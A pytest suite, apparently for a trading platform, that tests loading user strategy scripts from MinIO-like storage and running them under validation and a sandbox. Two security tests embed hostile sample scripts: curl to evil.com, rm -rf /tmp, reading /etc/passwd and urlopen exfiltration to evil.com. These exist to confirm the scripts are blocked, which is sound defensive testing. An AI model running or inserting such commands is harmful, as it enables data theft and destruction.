"""
End-to-end tests for MinIO storage to execution workflow
Tests complete pipeline from script storage through secure execution
"""

import asyncio
import os
import shutil
import tempfile
from datetime import UTC, datetime
from unittest.mock import patch

import pytest

from app.errors import ExternalFunctionExecutionError, SecurityError
from app.schemas.config_schema import ExternalFunctionConfig, TickProcessingContext
from app.security.sandbox_enhancements import EnhancedSandbox
from app.services.external_function_executor import ExternalFunctionExecutor


class TestMinIOToExecutionWorkflow:
    """Test complete workflow from MinIO storage to secure execution"""

    @pytest.fixture
    def temp_storage_dir(self):
        """Create temporary storage directory mimicking MinIO"""
        temp_dir = tempfile.mkdtemp()
        yield temp_dir
        shutil.rmtree(temp_dir)

    @pytest.fixture
    def executor(self):
        """Create executor instance"""
        return ExternalFunctionExecutor()

    @pytest.fixture
    def enhanced_sandbox(self):
        """Create enhanced sandbox instance"""
        return EnhancedSandbox()

    @pytest.fixture
    def sample_tick_context(self):
        """Sample tick processing context"""
        return TickProcessingContext(
            instrument_key="NSE@RELIANCE@EQ",
            timestamp=datetime.now(UTC),
            tick_data={
                "ltp": {"value": 2500.75, "currency": "INR"},
                "high": {"value": 2515.00},
                "low": {"value": 2485.50},
                "open": {"value": 2490.00},
                "volume": 1500000,
                "bid": {"value": 2500.50},
                "ask": {"value": 2500.75}
            },
            aggregated_data={
                "sma_20": 2485.30,
                "sma_50": 2465.20,
                "rsi_14": 68.5,
                "volume_avg": 1200000
            }
        )

    @pytest.fixture
    def trading_strategy_script(self):
        """Advanced trading strategy script"""
        return '''
def execute_strategy(tick_data, parameters):
    """
    Advanced momentum trading strategy
    Uses multiple indicators and risk management
    """
    # Extract market data
    current_price = tick_data["ltp"]["value"]
    volume = tick_data["volume"]
    high = tick_data["high"]["value"]
    low = tick_data["low"]["value"]

    # Extract parameters
    risk_tolerance = parameters.get("risk_tolerance", 0.02)
    position_size = parameters.get("position_size", 1000)
    stop_loss_pct = parameters.get("stop_loss", 0.015)

    # Calculate indicators
    price_range = high - low
    volume_ratio = volume / parameters.get("avg_volume", 1000000)

    # Trading logic
    signals = []

    # Momentum signal
    if current_price > parameters.get("sma_20", current_price * 0.99):
        if volume_ratio > 1.2:  # High volume confirmation
            signals.append({
                "type": "momentum_buy",
                "price": current_price,
                "confidence": min(0.9, volume_ratio * 0.3),
                "position_size": int(position_size * risk_tolerance),
                "stop_loss": current_price * (1 - stop_loss_pct)
            })

    # Mean reversion signal
    rsi = parameters.get("rsi", 50)
    if rsi > 70 and price_range / current_price > 0.02:
        signals.append({
            "type": "mean_reversion_sell",
            "price": current_price,
            "confidence": 0.6,
            "position_size": int(position_size * 0.5),
            "target": current_price * 0.98
        })

    # Risk assessment
    market_risk = "high" if volume_ratio > 2.0 else "normal"

    return {
        "signals": signals,
        "market_analysis": {
            "current_price": current_price,
            "volume_ratio": volume_ratio,
            "price_range_pct": price_range / current_price,
            "risk_level": market_risk
        },
        "execution_timestamp": tick_data.get("timestamp", "unknown")
    }
'''

    @pytest.fixture
    def risk_management_script(self):
        """Risk management overlay script"""
        return '''
def calculate_risk(tick_data, parameters):
    """
    Portfolio risk calculation
    """
    current_price = tick_data["ltp"]["value"]
    portfolio_value = parameters.get("portfolio_value", 1000000)
    position_value = parameters.get("position_value", 0)

    # Calculate exposure
    exposure_pct = position_value / portfolio_value if portfolio_value > 0 else 0

    # Risk metrics
    var_1day = position_value * 0.02  # 2% daily VaR
    max_drawdown = parameters.get("max_drawdown", 0.1)

    # Risk signals
    risk_alerts = []

    if exposure_pct > 0.1:  # More than 10% exposure
        risk_alerts.append({
            "level": "warning",
            "message": f"High exposure: {exposure_pct:.1%}",
            "recommendation": "reduce_position"
        })

    if var_1day > portfolio_value * 0.005:  # VaR > 0.5% of portfolio
        risk_alerts.append({
            "level": "critical",
            "message": f"VaR exceeded: {var_1day:,.0f}",
            "recommendation": "hedge_position"
        })

    return {
        "risk_metrics": {
            "exposure_percentage": exposure_pct,
            "value_at_risk": var_1day,
            "portfolio_value": portfolio_value,
            "position_value": position_value
        },
        "alerts": risk_alerts,
        "risk_score": min(10, exposure_pct * 50 + len(risk_alerts) * 2)
    }
'''

    # End-to-End Workflow Tests

    @patch('app.services.external_function_executor.settings')
    async def test_complete_storage_to_execution_workflow(self, mock_settings, temp_storage_dir, executor, sample_tick_context, trading_strategy_script):
        """Test complete workflow from storage to execution"""
        mock_settings.EXTERNAL_FUNCTIONS_STORAGE = temp_storage_dir

        # Step 1: Store script in MinIO-like storage
        user_id = "trader_123"
        script_name = "momentum_strategy"

        user_dir = os.path.join(temp_storage_dir, user_id)
        os.makedirs(user_dir, exist_ok=True)

        script_path = os.path.join(user_dir, f"{script_name}.py")
        with open(script_path, 'w') as f:
            f.write(trading_strategy_script)

        # Step 2: Create function configuration
        config = ExternalFunctionConfig(
            name="momentum_strategy",
            function_name="execute_strategy",
            function_path=f"{user_id}/{script_name}.py",
            file_path=f"{user_id}/{script_name}.py",
            parameters={
                "risk_tolerance": 0.03,
                "position_size": 2000,
                "stop_loss": 0.02,
                "avg_volume": 1200000,
                "sma_20": 2485.30,
                "rsi": 68.5
            },
            timeout=10,
            memory_limit_mb=64
        )

        # Step 3: Execute complete workflow
        start_time = datetime.now()

        try:
            # Load script securely
            script_content = await executor._load_function_securely(config)
            assert script_content == trading_strategy_script

            # Validate script
            executor._validate_function_code(script_content, config)

            # Compile safely
            compiled_code = executor.compile_function_safely(script_content, config)
            assert compiled_code is not None

            # Prepare execution context
            execution_context = executor.prepare_execution_context(sample_tick_context, config)

            # Execute function
            exec(compiled_code, execution_context)
            function = execution_context["execute_strategy"]
            result = function(sample_tick_context.tick_data, config.parameters)

            # Step 4: Validate results
            assert "signals" in result
            assert "market_analysis" in result
            assert isinstance(result["signals"], list)

            # Check signal structure
            if result["signals"]:
                signal = result["signals"][0]
                assert "type" in signal
                assert "price" in signal
                assert "confidence" in signal
                assert signal["confidence"] <= 1.0

            # Check market analysis
            analysis = result["market_analysis"]
            assert analysis["current_price"] == 2500.75
            assert "volume_ratio" in analysis
            assert "risk_level" in analysis

            execution_time = (datetime.now() - start_time).total_seconds()
            assert execution_time < 5.0, f"Execution too slow: {execution_time}s"

        except Exception as e:
            pytest.fail(f"End-to-end workflow failed: {e}")

    @patch('app.services.external_function_executor.settings')
    async def test_multi_function_pipeline_execution(self, mock_settings, temp_storage_dir, executor, sample_tick_context, trading_strategy_script, risk_management_script):
        """Test execution of multiple functions in a pipeline"""
        mock_settings.EXTERNAL_FUNCTIONS_STORAGE = temp_storage_dir

        # set up storage for multiple scripts
        user_id = "portfolio_manager"
        user_dir = os.path.join(temp_storage_dir, user_id)
        os.makedirs(user_dir, exist_ok=True)

        # Store multiple scripts
        scripts = {
            "trading_strategy": trading_strategy_script,
            "risk_manager": risk_management_script
        }

        for script_name, script_content in scripts.items():
            script_path = os.path.join(user_dir, f"{script_name}.py")
            with open(script_path, 'w') as f:
                f.write(script_content)

        # Configure multiple functions
        configs = [
            ExternalFunctionConfig(
                name="trading_strategy",
                function_name="execute_strategy",
                function_path=f"{user_id}/trading_strategy.py",
                file_path=f"{user_id}/trading_strategy.py",
                parameters={
                    "risk_tolerance": 0.025,
                    "position_size": 1500,
                    "stop_loss": 0.018,
                    "avg_volume": 1200000,
                    "sma_20": 2485.30,
                    "rsi": 68.5
                },
                timeout=8,
                memory_limit_mb=48
            ),
            ExternalFunctionConfig(
                name="risk_manager",
                function_name="calculate_risk",
                function_path=f"{user_id}/risk_manager.py",
                file_path=f"{user_id}/risk_manager.py",
                parameters={
                    "portfolio_value": 5000000,
                    "position_value": 375000,
                    "max_drawdown": 0.08
                },
                timeout=5,
                memory_limit_mb=32
            )
        ]

        # Execute pipeline
        results = {}

        for config in configs:
            try:
                # Load and execute each function
                script_content = await executor._load_function_securely(config)
                executor._validate_function_code(script_content, config)
                compiled_code = executor.compile_function_safely(script_content, config)

                execution_context = executor.prepare_execution_context(sample_tick_context, config)
                exec(compiled_code, execution_context)

                function = execution_context[config.function_name]
                result = function(sample_tick_context.tick_data, config.parameters)
                results[config.name] = result

            except Exception as e:
                pytest.fail(f"Pipeline function {config.name} failed: {e}")

        # Validate pipeline results
        assert "trading_strategy" in results
        assert "risk_manager" in results

        # Check trading strategy output
        trading_result = results["trading_strategy"]
        assert "signals" in trading_result
        assert "market_analysis" in trading_result

        # Check risk management output
        risk_result = results["risk_manager"]
        assert "risk_metrics" in risk_result
        assert "alerts" in risk_result
        assert "risk_score" in risk_result

        # Validate risk metrics
        risk_metrics = risk_result["risk_metrics"]
        assert risk_metrics["exposure_percentage"] == 0.075  # 375k/5M
        assert "value_at_risk" in risk_metrics

        # Check for risk alerts
        if risk_result["alerts"]:
            alert = risk_result["alerts"][0]
            assert "level" in alert
            assert "message" in alert

    # Error Recovery and Resilience Tests

    @patch('app.services.external_function_executor.settings')
    async def test_workflow_with_storage_failure_recovery(self, mock_settings, temp_storage_dir, executor, sample_tick_context):
        """Test workflow recovery from storage failures"""
        mock_settings.EXTERNAL_FUNCTIONS_STORAGE = temp_storage_dir

        config = ExternalFunctionConfig(
            name="test_function",
            function_name="test_func",
            function_path="user_123/missing_script.py",
            file_path="user_123/missing_script.py",
            parameters={},
            timeout=5,
            memory_limit_mb=32
        )

        # Test graceful handling of missing file
        with pytest.raises(SecurityError, match="Function file not found"):
            await executor._load_function_securely(config)

        # Verify system remains stable after error
        # Create a valid script for follow-up test
        user_dir = os.path.join(temp_storage_dir, "user_123")
        os.makedirs(user_dir, exist_ok=True)

        valid_script = '''
def test_func(tick_data, parameters):
    return {"status": "recovered", "price": tick_data["ltp"]["value"]}
'''

        script_path = os.path.join(user_dir, "recovery_script.py")
        with open(script_path, 'w') as f:
            f.write(valid_script)

        # Test recovery with valid script
        recovery_config = ExternalFunctionConfig(
            name="recovery_test",
            function_name="test_func",
            function_path="user_123/recovery_script.py",
            file_path="user_123/recovery_script.py",
            parameters={},
            timeout=5,
            memory_limit_mb=32
        )

        script_content = await executor._load_function_securely(recovery_config)
        assert "status" in script_content
        assert "recovered" in script_content

    @patch('app.services.external_function_executor.settings')
    async def test_workflow_with_security_validation_failure(self, mock_settings, temp_storage_dir, executor, sample_tick_context):
        """Test workflow handling of security validation failures"""
        mock_settings.EXTERNAL_FUNCTIONS_STORAGE = temp_storage_dir

        # Create malicious script
        user_id = "malicious_user"
        user_dir = os.path.join(temp_storage_dir, user_id)
        os.makedirs(user_dir, exist_ok=True)

        malicious_script = '''
import os
import subprocess

def evil_function(tick_data, parameters):
    # Attempt system compromise
    os.system("curl http://evil.com/steal-data")
    subprocess.run(["rm", "-rf", "/tmp"])
    exec("import sys; sys.exit()")
    return {"hacked": True}
'''

        script_path = os.path.join(user_dir, "evil_script.py")
        with open(script_path, 'w') as f:
            f.write(malicious_script)

        config = ExternalFunctionConfig(
            name="evil_function",
            function_name="evil_function",
            function_path=f"{user_id}/evil_script.py",
            file_path=f"{user_id}/evil_script.py",
            parameters={},
            timeout=5,
            memory_limit_mb=32
        )

        # Test security validation blocks malicious script
        script_content = await executor._load_function_securely(config)

        with pytest.raises(SecurityError, match="Prohibited code pattern detected"):
            executor._validate_function_code(script_content, config)

    # Performance and Load Testing

    @patch('app.services.external_function_executor.settings')
    async def test_workflow_performance_under_load(self, mock_settings, temp_storage_dir, executor, sample_tick_context):
        """Test workflow performance under concurrent load"""
        mock_settings.EXTERNAL_FUNCTIONS_STORAGE = temp_storage_dir

        # Create multiple user scripts
        scripts_count = 10
        user_dirs = []

        for i in range(scripts_count):
            user_id = f"user_{i:03d}"
            user_dir = os.path.join(temp_storage_dir, user_id)
            os.makedirs(user_dir, exist_ok=True)
            user_dirs.append((user_id, user_dir))

            # Create unique script for each user
            script_content = f'''
def strategy_{i}(tick_data, parameters):
    """Strategy {i} implementation"""
    price = tick_data["ltp"]["value"]
    factor = {i + 1} * 0.01

    return {{
        "strategy_id": {i},
        "signal": "buy" if price > 2500 else "sell",
        "strength": price * factor,
        "timestamp": "test"
    }}
'''

            script_path = os.path.join(user_dir, f"strategy_{i}.py")
            with open(script_path, 'w') as f:
                f.write(script_content)

        # Create configs for concurrent execution
        configs = []
        for i, (user_id, _user_dir) in enumerate(user_dirs):
            config = ExternalFunctionConfig(
                name=f"strategy_{i}",
                function_name=f"strategy_{i}",
                function_path=f"{user_id}/strategy_{i}.py",
                file_path=f"{user_id}/strategy_{i}.py",
                parameters={"factor": i * 0.01},
                timeout=5,
                memory_limit_mb=32
            )
            configs.append(config)

        # Execute concurrent workflow
        start_time = datetime.now()

        async def execute_single_workflow(config):
            try:
                script_content = await executor._load_function_securely(config)
                executor._validate_function_code(script_content, config)
                compiled_code = executor.compile_function_safely(script_content, config)

                execution_context = executor.prepare_execution_context(sample_tick_context, config)
                exec(compiled_code, execution_context)

                function = execution_context[config.function_name]
                return function(sample_tick_context.tick_data, config.parameters)
            except Exception as e:
                return {"error": str(e)}

        # Run all workflows concurrently
        tasks = [execute_single_workflow(config) for config in configs]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        execution_time = (datetime.now() - start_time).total_seconds()

        # Validate performance
        successful_results = [r for r in results if not isinstance(r, Exception) and "error" not in r]
        success_rate = len(successful_results) / len(results)

        assert success_rate >= 0.8, f"Low success rate under load: {success_rate:.2%}"
        assert execution_time < 10.0, f"Workflow too slow under load: {execution_time:.2f}s"

        # Validate result correctness
        for _i, result in enumerate(successful_results[:5]):  # Check first 5
            assert "strategy_id" in result
            assert "signal" in result
            assert result["signal"] in ["buy", "sell"]

    # Enhanced Sandbox Integration Tests

    async def test_enhanced_sandbox_integration(self, enhanced_sandbox, sample_tick_context):
        """Test integration with enhanced sandbox execution"""

        # Test script with resource usage
        resource_script = '''
def compute_intensive(tick_data, parameters):
    """Resource intensive computation"""
    iterations = parameters.get("iterations", 1000)
    price = tick_data["ltp"]["value"]

    # Simulate computation
    result = 0
    for i in range(iterations):
        result += i * price * 0.001

    return {
        "computation_result": result,
        "iterations_completed": iterations,
        "input_price": price
    }
'''

        # Execute with resource limits
        result = await enhanced_sandbox.execute_script_safe(
            script_content=resource_script,
            function_name="compute_intensive",
            input_data=sample_tick_context.tick_data,
            limits={
                "memory_mb": 32,
                "cpu_time_seconds": 3,
                "wall_time_seconds": 5,
                "max_processes": 1
            }
        )

        # Validate enhanced sandbox execution
        assert "computation_result" in result
        assert "iterations_completed" in result
        assert result["input_price"] == 2500.75

    async def test_enhanced_sandbox_security_blocking(self, enhanced_sandbox, sample_tick_context):
        """Test enhanced sandbox blocks malicious operations"""

        # Test various malicious patterns
        malicious_scripts = [
            # File system access
            '''
def file_access(tick_data, parameters):
    with open("/etc/passwd", "r") as f:
        return {"stolen": f.read()}
''',
            # Network access
            '''
def network_access(tick_data, parameters):
    import urllib.request
    response = urllib.request.urlopen("http://evil.com")
    return {"exfiltrated": response.read()}
''',
            # Process spawning
            '''
def process_spawn(tick_data, parameters):
    import subprocess
    result = subprocess.run(["ls", "/"], capture_output=True)
    return {"command_output": result.stdout.decode()}
'''
        ]

        for script in malicious_scripts:
            with pytest.raises((SecurityError, ExternalFunctionExecutionError)):
                await enhanced_sandbox.execute_script_safe(
                    script_content=script,
                    function_name=script.split("def ")[1].split("(")[0],
                    input_data=sample_tick_context.tick_data,
                    limits={"memory_mb": 32, "cpu_time_seconds": 2}
                )
